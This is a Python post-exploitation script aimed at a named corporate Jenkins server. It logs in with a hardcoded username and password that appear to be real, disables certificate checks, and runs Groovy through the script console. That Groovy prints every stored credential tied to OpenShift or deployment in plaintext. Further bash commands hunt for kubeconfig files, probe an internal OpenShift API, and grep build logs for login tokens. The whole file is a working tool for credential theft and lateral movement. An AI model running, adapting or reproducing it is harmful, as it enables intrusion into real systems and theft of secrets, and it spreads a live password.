import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK1 = r'''import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def creds = CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardCredentials.class, Jenkins.instance, null, null)
creds.each { c ->
    if (c.id.contains('ocp') || c.id.contains('openshift') || c.id.contains('kube') || c.id.contains('deploy') || c.id.contains('token') || c.description?.contains('openshift')) {
        println "ID: ${c.id} | Type: ${c.class.simpleName} | Desc: ${c.description}"
        if (c.respondsTo('getUsername')) println "  User: ${c.getUsername()}"
        if (c.respondsTo('getPassword')) println "  Pass: ${c.getPassword()}"
        if (c.respondsTo('getSecret')) println "  Secret: ${c.getSecret()}"
    }
}
'''

TASK2 = r'''def r = ["bash","-c","""
# Check if oc CLI exists
which oc 2>/dev/null || which kubectl 2>/dev/null
echo '---'
# Try curl to OCP API
curl -sk https://console.dev.amxnova.net:8443/api/v1/namespaces 2>/dev/null | head -c 2000
echo '---'
# Check for kubeconfig
find / -name '.kube' -o -name 'kubeconfig' -o -name '*.kubeconfig' 2>/dev/null | head -10
cat /var/jenkins_home/.kube/config 2>/dev/null || cat /root/.kube/config 2>/dev/null
"""].execute().text
println r
'''

TASK3 = r'''def r = ["bash","-c","""
# Find OCP token in workspace files
grep -r 'oc login\\|--token=' /var/jenkins_home/jobs/*/builds/*/log 2>/dev/null | tail -20
echo '---'
grep -r 'console.dev.amxnova.net\\|openshift' /var/jenkins_home/jobs/*/config.xml 2>/dev/null | head -20
"""].execute().text
println r
'''

TASKS = [
    ("TASK 1: OCP/OpenShift credentials in Jenkins store", TASK1),
    ("TASK 2: Reach OCP API + kubeconfig hunt", TASK2),
    ("TASK 3: OCP token in build logs/configs", TASK3),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
